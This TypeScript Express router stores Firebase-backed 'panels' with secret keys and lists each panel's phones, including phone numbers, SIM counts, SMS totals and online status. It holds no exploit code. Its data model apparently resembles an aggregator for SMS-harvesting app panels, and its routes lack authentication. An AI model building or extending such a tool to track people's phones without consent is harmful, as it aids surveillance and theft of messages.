import { Router, type IRouter } from "express";
import { db, panelsTable } from "@workspace/db";
import { eq } from "drizzle-orm";
import { fetchPanelDevices } from "../lib/firebase";
import { notifyNewPanel } from "../lib/notifications";
import {
  CreatePanelBody,
  DeletePanelParams,
  GetPanelDevicesParams,
} from "@workspace/api-zod";

const router: IRouter = Router();

router.get("/panels", async (_req, res): Promise<void> => {
  const panels = await db.select().from(panelsTable).orderBy(panelsTable.createdAt);
  res.json(
    panels.map((p) => ({
      id: p.id,
      name: p.name,
      firebaseUrl: p.firebaseUrl,
      createdAt: p.createdAt.toISOString(),
    }))
  );
});

router.post("/panels", async (req, res): Promise<void> => {
  const parsed = CreatePanelBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }
  const [panel] = await db
    .insert(panelsTable)
    .values({
      name: parsed.data.name,
      firebaseUrl: parsed.data.firebaseUrl,
      secretKey: parsed.data.secretKey,
    })
    .returning();

  const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
  void notifyNewPanel(panel.name, devices);

  res.status(201).json({
    id: panel.id,
    name: panel.name,
    firebaseUrl: panel.firebaseUrl,
    createdAt: panel.createdAt.toISOString(),
    totalDevices: devices.length,
    onlineDevices: devices.filter((device) => device.status).length,
    offlineDevices: devices.filter((device) => !device.status).length,
  });
});

router.delete("/panels/:id", async (req, res): Promise<void> => {
  const raw = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
  const params = DeletePanelParams.safeParse({ id: parseFloat(raw) });
  if (!params.success) {
    res.status(400).json({ error: "Invalid ID" });
    return;
  }
  const [deleted] = await db
    .delete(panelsTable)
    .where(eq(panelsTable.id, params.data.id))
    .returning();
  if (!deleted) {
    res.status(404).json({ error: "Panel not found" });
    return;
  }
  res.sendStatus(204);
});

router.get("/panels/:id/devices", async (req, res): Promise<void> => {
  const raw = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
  const params = GetPanelDevicesParams.safeParse({ id: parseFloat(raw) });
  if (!params.success) {
    res.status(400).json({ error: "Invalid ID" });
    return;
  }
  const [panel] = await db.select().from(panelsTable).where(eq(panelsTable.id, params.data.id));
  if (!panel) {
    res.status(404).json({ error: "Panel not found" });
    return;
  }
  const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
  res.json(devices.map((d) => ({
    id: d.id,
    name: d.name,
    status: d.status,
    phoneNumber: d.phoneNumber,
    battery: d.battery,
    model: d.model,
    lastSeen: d.lastSeen,
    simCount: d.simCount,
    totalSms: d.totalSms,
    panelId: d.panelId,
    panelName: d.panelName,
  })));
});

export default router;
